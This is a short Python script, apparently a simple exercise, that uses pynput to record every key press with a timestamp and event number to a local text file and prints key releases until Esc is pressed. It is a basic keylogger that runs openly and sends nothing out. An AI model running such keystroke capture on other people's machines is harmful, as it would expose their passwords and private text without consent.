from pynput.keyboard import Key, Listener
from datetime import datetime
i=0

def on_press(key):
    global i    
    i+=1
    fecha_formateada = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3] 
    try:
        tecla=key.char
    except AttributeError:
        tecla=key
    
    registro= f"{fecha_formateada} | {tecla} | evento_{i}\n"    
    with open("Caracteres.txt", "a") as file:
        file.write(registro)    

def on_release(key):
    print(f'key_released: {key}')
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()